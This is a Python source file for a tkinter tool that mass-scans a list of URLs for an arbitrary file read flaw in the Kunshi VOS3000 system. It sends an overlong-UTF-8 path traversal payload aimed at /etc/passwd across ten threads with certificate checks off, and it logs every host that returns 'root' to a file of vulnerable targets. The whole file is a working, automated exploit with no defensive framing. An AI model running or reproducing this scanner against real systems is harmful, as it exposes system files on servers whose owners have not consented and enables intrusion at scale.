import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def VOS3000_redfile_exp(url):
    poc = r"""/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            VOS3000_redfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            VOS3000_redfile_text.see(END)
            with open ("[exists]VOS3000_readfile_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            VOS3000_redfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            VOS3000_redfile_text.see(END)
    except Exception as err:
        VOS3000_redfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        VOS3000_redfile_text.see(END)
def get_VOS3000_redfile_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def VOS3000_redfile_gui():
    VOS3000_redfile = Toplevel()
    VOS3000_redfile.geometry("1035x455")
    VOS3000_redfile.title("Kunshi  virtual operation support system read any file [auto-muti-exp]")
    VOS3000_redfile.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    VOS3000_redfile.tk.call('wm', 'iconphoto', VOS3000_redfile._w, logo)
    global VOS3000_redfile_text
    VOS3000_redfile_text = scrolledtext.ScrolledText(VOS3000_redfile,width=123, height=25)
    VOS3000_redfile_text.grid(row=0, column=0, padx=10, pady=10)
    VOS3000_redfile_text.see(END)
    addrs = get_VOS3000_redfile_addr()
    max_thread_num = 10
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(VOS3000_redfile_exp, addr)
    VOS3000_redfile.mainloop()